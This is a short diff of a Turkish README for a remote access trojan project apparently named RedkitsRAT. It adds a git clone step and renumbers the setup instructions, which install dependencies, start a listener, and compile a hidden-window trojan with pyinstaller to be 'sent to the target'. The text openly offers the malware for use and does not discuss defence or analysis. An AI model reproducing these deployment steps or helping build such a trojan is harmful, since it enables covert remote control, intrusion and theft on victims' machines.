@@ -43,13 +43,16 @@ Bu RAT programının bedava sürümünü güvenle kullanabilirsiniz. Geliştiril
 Projeyi bilgisayarınıza indirdikten sonra terminal veya komut satırını açıp sırasıyla aşağıdaki komutları çalıştırın:
 
 ```bash
-# 1. Gerekli kütüphaneleri yükleyin
+# 1. Repoyu kopyala ve indir
+git clone https://github.com/YAYTech/RedkitsRAT.git
+
+# 2. Gerekli kütüphaneleri yükleyin
 pip install -r requirements.txt
 
-# 2. Dinleyiciyi (Listener) başlatın
+# 3. Dinleyiciyi (Listener) başlatın
 python listener.py
 
-# 3. Hedefe gönderilecek trojanı oluşturun
+# 4. Hedefe gönderilecek trojanı oluşturun
 pyinstaller --onefile --noconsole trojan.py
 
 ```
